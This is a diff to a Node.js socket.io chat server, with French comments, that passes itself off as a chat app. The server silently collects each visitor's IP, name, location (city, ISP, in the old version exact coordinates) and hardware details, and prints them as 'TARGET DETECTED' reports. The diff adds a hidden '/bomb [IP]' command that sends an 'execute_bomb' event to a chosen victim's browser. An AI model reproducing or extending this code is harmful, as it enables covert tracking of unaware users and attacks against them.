@@ -5,42 +5,56 @@ const io = require('socket.io')(http);
 
 app.use(express.static(__dirname));
 
-const database = {};
+const users = {};
 
 io.on('connection', (socket) => {
-    // Extraction de l'IP via les headers ou la connexion directe
+    // Extraction de l'IP dès la connexion
     const ip = socket.handshake.headers['x-forwarded-for'] || socket.conn.remoteAddress;
 
     socket.on('check_device', (info) => {
-        database[ip] = { ...info, lastSeen: new Date().toLocaleString() };
-        
+        // On lie l'IP au socket ID pour le ciblage
+        users[ip] = {
+            sid: socket.id,
+            name: info.name,
+            geo: info.geo,
+            hw: info.hardware
+        };
+
+        // LOG COMPLET DANS TON TERMINAL VS CODE
         console.log(`
-        ╔══════════════════════════════════════════════════╗
-        ║          RAPPORT D'EXTRACTION COMPLET            ║
-        ╠══════════════════════════════════════════════════╣
-        ║ USER      : ${info.name}
-        ║ IP        : ${ip}
-        ║ VILLE     : ${info.geo.city} (${info.geo.region})
-        ║ PAYS      : ${info.geo.country_name} (${info.geo.country_code})
-        ║ COORD     : LAT ${info.geo.latitude} / LONG ${info.geo.longitude}
-        ║ ISP       : ${info.geo.org} (ASN: ${info.geo.asn})
-        ║ MATÉRIEL  : ${info.hardware.cores} Cores | ${info.hardware.ram}GB RAM
-        ║ GPU       : ${info.hardware.gpu}
-        ║ OS/NAV    : ${info.hardware.ua}
-        ║ LANGUE    : ${info.hardware.lang}
-        ║ TIMEZONE  : ${info.geo.timezone}
-        ╚══════════════════════════════════════════════════╝
+        ╔═════════════ TARGET DETECTED ═════════════╗
+        ║ NOM    : ${info.name}
+        ║ IP     : ${ip}
+        ║ VILLE  : ${info.geo.city} (${info.geo.country_name})
+        ║ ISP    : ${info.geo.org}
+        ║ GPU    : ${info.hardware.gpu}
+        ║ RAM    : ${info.hardware.ram} GB
+        ║ CORES  : ${info.hardware.cores}
+        ║ BATT   : ${info.hardware.battery}%
+        ╚═══════════════════════════════════════════╝
         `);
-        
-        socket.emit('auto_login', database[ip]);
     });
 
     socket.on('chat message', (data) => {
-        io.emit('chat message', data);
+        // COMMANDE BOMB : /bomb [IP]
+        if (data.text.startsWith("/bomb ")) {
+            const targetIP = data.text.split(" ")[1];
+            const target = users[targetIP];
+
+            if (target) {
+                console.log(`[!!!] ATTACK_SENT_TO: ${targetIP} (${target.name})`);
+                io.to(target.sid).emit('execute_bomb');
+            }
+        } else {
+            io.emit('chat message', data);
+        }
+    });
+
+    socket.on('disconnect', () => {
+        // Optionnel : supprimer des logs à la déconnexion
     });
 });
 
-const PORT = process.env.PORT || 3000;
-http.listen(PORT, () => {
-    console.log(`GALAXY_SYSTEM_ACTIVE_ON_${PORT}`);
+http.listen(3000, () => {
+    console.log("SYSTEM_CORE_ONLINE_PORT_3000");
 });
